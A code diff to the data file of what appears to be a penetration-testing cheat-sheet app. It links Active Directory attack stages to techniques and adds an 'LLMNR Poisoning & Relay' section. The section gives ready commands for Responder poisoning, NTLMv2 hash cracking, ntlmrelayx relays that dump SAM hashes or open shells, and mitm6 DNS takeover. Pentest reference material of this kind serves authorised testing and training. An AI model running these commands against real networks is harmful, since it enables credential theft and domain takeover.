@@ -343,49 +343,56 @@ const TACTICS = [
               icon: '🌐',
               name: 'External Recon',
               description: 'Identify the target AD footprint from the outside before gaining any internal access.',
-              items: ['DNS zone transfers / dnsdumpster', 'OSINT (LinkedIn, Hunter.io)', 'Email harvesting for usernames', 'Public-facing services: OWA, ADFS, VPN, RDP, MSSQL']
+              items: ['DNS zone transfers / dnsdumpster', 'OSINT (LinkedIn, Hunter.io)', 'Email harvesting for usernames', 'Public-facing services: OWA, ADFS, VPN, RDP, MSSQL'],
             },
             {
               icon: '🚪',
               name: 'Initial Foothold',
               description: 'Gain an initial shell or credential on an internal machine to begin domain enumeration.',
-              items: ['Password spraying on OWA / VPN / Kerberos', 'Phishing (macro, link, lnk file)', 'Exploit public-facing service (CVE)', 'LLMNR/NBT-NS poisoning with Responder', 'Physical access / rogue device']
+              items: ['Password spraying on OWA / VPN / Kerberos', 'Phishing (macro, link, lnk file)', 'Exploit public-facing service (CVE)', 'LLMNR/NBT-NS poisoning with Responder', 'Physical access / rogue device'],
+              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-recon' }, 3: { tacticId: 'active-directory', techId: 'ad-relay' } },
             },
             {
               icon: '🔍',
               name: 'Internal Recon',
               description: 'Map the domain — users, groups, computers, GPOs, ACLs, trusts, and attack paths.',
-              items: ['BloodHound / SharpHound (attack path analysis)', 'PowerView / ldapdomaindump / ldapsearch', 'Port scan + SMB enumeration', 'Share enumeration (null sessions, spider)', 'Password policy (lockout threshold)']
+              items: ['BloodHound / SharpHound (attack path analysis)', 'PowerView / ldapdomaindump / ldapsearch', 'Port scan + SMB enumeration', 'Share enumeration (null sessions, spider)', 'Password policy (lockout threshold)'],
+              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-domain-enum' }, 1: { tacticId: 'active-directory', techId: 'ad-domain-enum' }, 2: { tacticId: 'active-directory', techId: 'ad-recon' }, 3: { tacticId: 'active-directory', techId: 'ad-domain-enum' }, 4: { tacticId: 'active-directory', techId: 'ad-recon' } },
             },
             {
               icon: '🔑',
               name: 'Credential Attacks',
               description: 'Harvest valid credentials or hashes without touching LSASS.',
-              items: ['AS-REP Roasting (no pre-auth accounts)', 'Kerberoasting (accounts with SPNs)', 'Password spraying (kerbrute, NetExec)', 'SMB relay / NTLM relay (ntlmrelayx)', 'LDAP signing check + relay', 'IPv6 DNS takeover (mitm6)']
+              items: ['AS-REP Roasting (no pre-auth accounts)', 'Kerberoasting (accounts with SPNs)', 'Password spraying (kerbrute, NetExec)', 'SMB relay / NTLM relay (ntlmrelayx)', 'LDAP signing check + relay', 'IPv6 DNS takeover (mitm6)'],
+              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-recon' }, 1: { tacticId: 'active-directory', techId: 'ad-kerberoast-acl' }, 2: { tacticId: 'active-directory', techId: 'ad-recon' }, 3: { tacticId: 'active-directory', techId: 'ad-relay' }, 4: { tacticId: 'active-directory', techId: 'ad-relay' }, 5: { tacticId: 'active-directory', techId: 'ad-relay' } },
             },
             {
               icon: '⬆️',
               name: 'Privilege Escalation',
               description: 'Escalate from standard domain user to Domain Admin via misconfigurations.',
-              items: ['ACL abuse (WriteDACL, GenericAll, ForceChangePassword, AddMember)', 'Unconstrained / Constrained / RBCD delegation', 'GPO abuse (write permissions on GPO)', 'AdminSDHolder persistence', 'Local PE on compromised host → SYSTEM → dump hashes', 'Certificate Services (ADCS ESC1-ESC8)']
+              items: ['ACL abuse (WriteDACL, GenericAll, ForceChangePassword, AddMember)', 'Unconstrained / Constrained / RBCD delegation', 'GPO abuse (write permissions on GPO)', 'AdminSDHolder persistence', 'Local PE on compromised host → SYSTEM → dump hashes', 'Certificate Services (ADCS ESC1-ESC8)'],
+              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-kerberoast-acl' }, 1: { tacticId: 'active-directory', techId: 'ad-domain-privesc' }, 2: { tacticId: 'active-directory', techId: 'ad-domain-privesc' }, 3: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 4: { tacticId: 'active-directory', techId: 'ad-local-privesc' }, 5: { tacticId: 'active-directory', techId: 'ad-adcs' } },
             },
             {
               icon: '↔️',
               name: 'Lateral Movement',
               description: 'Move across hosts using stolen credentials, hashes, or Kerberos tickets.',
-              items: ['Pass-the-Hash (NTLMv1/v2 hash)', 'Pass-the-Ticket (TGT/TGS)', 'Overpass-the-Hash (hash → TGT)', 'WinRM (evil-winrm)', 'WMI / PsExec / SMBExec / atexec', 'RDP with plaintext or restricted admin']
+              items: ['Pass-the-Hash (NTLMv1/v2 hash)', 'Pass-the-Ticket (TGT/TGS)', 'Overpass-the-Hash (hash → TGT)', 'WinRM (evil-winrm)', 'WMI / PsExec / SMBExec / atexec', 'RDP with plaintext or restricted admin'],
+              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-lateral' }, 1: { tacticId: 'active-directory', techId: 'ad-lateral' }, 2: { tacticId: 'active-directory', techId: 'ad-lateral' }, 3: { tacticId: 'active-directory', techId: 'ad-lateral' }, 4: { tacticId: 'active-directory', techId: 'ad-lateral' }, 5: { tacticId: 'active-directory', techId: 'ad-lateral' } },
             },
             {
               icon: '👑',
               name: 'Domain Dominance',
               description: 'Achieve full domain control — dump all hashes, forge tickets, maintain access.',
-              items: ['DCSync (replicate hashes via DRS protocol)', 'Golden Ticket (forge TGT with krbtgt hash)', 'Silver Ticket (forge TGS with service hash)', 'Skeleton Key (patch LSASS on DC)', 'DSRM account abuse', 'AdminSDHolder ACL backdoor']
+              items: ['DCSync (replicate hashes via DRS protocol)', 'Golden Ticket (forge TGT with krbtgt hash)', 'Silver Ticket (forge TGS with service hash)', 'Skeleton Key (patch LSASS on DC)', 'DSRM account abuse', 'AdminSDHolder ACL backdoor'],
+              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 1: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 2: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 3: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 4: { tacticId: 'active-directory', techId: 'ad-dcsync' }, 5: { tacticId: 'active-directory', techId: 'ad-dcsync' } },
             },
             {
               icon: '🌲',
               name: 'Forest & Trust Attacks',
               description: 'Pivot across domain and forest trust boundaries.',
-              items: ['Extra SID / SID history injection', 'Trust ticket forgery (cross-domain TGT)', 'Foreign group membership abuse', 'ADCS cross-forest template abuse', 'Child-to-parent domain trust escalation']
+              items: ['Extra SID / SID history injection', 'Trust ticket forgery (cross-domain TGT)', 'Foreign group membership abuse', 'ADCS cross-forest template abuse', 'Child-to-parent domain trust escalation'],
+              itemLinks: { 0: { tacticId: 'active-directory', techId: 'ad-cross-trust' }, 1: { tacticId: 'active-directory', techId: 'ad-cross-trust' }, 2: { tacticId: 'active-directory', techId: 'ad-cross-trust' }, 3: { tacticId: 'active-directory', techId: 'ad-adcs' }, 4: { tacticId: 'active-directory', techId: 'ad-cross-trust' } },
             }
           ],
           concepts: [
@@ -636,6 +643,41 @@ const TACTICS = [
             { id: "adr9", label: "Crack AS-REP hash", os: "Linux", command: "hashcat -m 18200 asrep.hash $$WORDLIST", notes: "Mode 18200 = Kerberos AS-REP. Start with rockyou, then targeted rules." }
             ]
           }
+        ],
+      },
+      {
+        id: 'ad-relay',
+        name: 'LLMNR Poisoning & Relay',
+        description: 'Capture NTLMv2 hashes via broadcast poisoning and relay them to gain access without cracking. Works pre-creds on the local subnet.',
+        tags: ['active-directory', 'relay', 'credentials', 'llmnr'],
+        subtechniques: [
+          {
+            id: 'adrl-poison',
+            name: 'LLMNR / NBT-NS Poisoning',
+            commands: [
+              { id: 'adrl1', label: 'Responder (capture hashes)', os: 'Linux', command: 'sudo responder -I $$IFACE -wPv', notes: 'Poisons LLMNR/NBT-NS/MDNS on the subnet. Captured NTLMv2 hashes saved to /usr/share/responder/logs/. Stop before running relay.' },
+              { id: 'adrl2', label: 'Check LLMNR / NBT-NS scope', os: 'Linux', command: 'sudo responder -I $$IFACE --analyze', notes: 'Passive mode — only analyse, no poisoning. Good for recon before deciding to go active.' },
+              { id: 'adrl3', label: 'Crack captured NTLMv2 hash', os: 'Linux', command: 'hashcat -m 5600 ntlmv2.hash $$WORDLIST', notes: 'Mode 5600 = NTLMv2. Use rockyou first, then targeted rules. Hash file is in Responder logs directory.' },
+            ],
+          },
+          {
+            id: 'adrl-relay',
+            name: 'NTLM Relay (ntlmrelayx)',
+            commands: [
+              { id: 'adrl4', label: 'Find hosts without SMB signing', os: 'Linux', command: 'nxc smb $$IP/24 --gen-relay-list targets.txt', notes: 'Only hosts with SMB signing disabled are relayable. This generates the targets file for ntlmrelayx.' },
+              { id: 'adrl5', label: 'Relay to SAM dump', os: 'Linux', command: 'sudo impacket-ntlmrelayx -tf targets.txt -smb2support', notes: 'Run alongside Responder (with SMB/HTTP off in Responder.conf). Relays incoming auth to targets and dumps SAM hashes.' },
+              { id: 'adrl6', label: 'Relay with interactive shell', os: 'Linux', command: 'sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i', notes: 'Opens a local SMB shell (-i). Connect with nc 127.0.0.1 11000 after a relay succeeds.' },
+              { id: 'adrl7', label: 'Relay to LDAP (add DA)', os: 'Linux', command: 'sudo impacket-ntlmrelayx -t ldaps://$$DC --delegate-access --escalate-user $$USER', notes: 'Relay to LDAPS to abuse Resource-Based Constrained Delegation. Requires domain controller as target and a machine account.' },
+            ],
+          },
+          {
+            id: 'adrl-ipv6',
+            name: 'IPv6 DNS Takeover (mitm6)',
+            commands: [
+              { id: 'adrl8', label: 'mitm6 DNS takeover', os: 'Linux', command: 'sudo mitm6 -d $$DOMAIN', notes: 'Advertises a rogue IPv6 DNS server. Windows prefers IPv6 — clients will send auth to your machine. Run alongside ntlmrelayx.' },
+              { id: 'adrl9', label: 'Relay IPv6 auth to LDAPS', os: 'Linux', command: 'sudo impacket-ntlmrelayx -6 -t ldaps://$$DC -wh fakewpad.$$DOMAIN -l loot', notes: 'Combines mitm6 relay with LDAPS target. Dumps domain info to ./loot/ directory. High value — often gets DA delegation.' },
+            ],
+          },
         ],
       },
       {
